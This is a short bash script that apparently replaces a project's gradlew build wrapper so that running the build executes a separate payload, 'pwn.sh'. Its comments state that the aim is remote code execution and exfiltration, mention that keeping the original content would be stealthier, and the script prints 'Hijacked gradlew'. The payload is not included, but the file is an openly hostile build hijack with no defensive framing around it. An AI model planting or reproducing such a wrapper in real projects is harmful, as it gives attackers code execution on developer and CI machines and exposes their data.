#!/bin/bash
bash pwn.sh
# Original gradlew content would go here, but for RCE we just need our payload.
# If we want to be stealthy we should include the original, but here we just want the exfil.
echo "Hijacked gradlew"
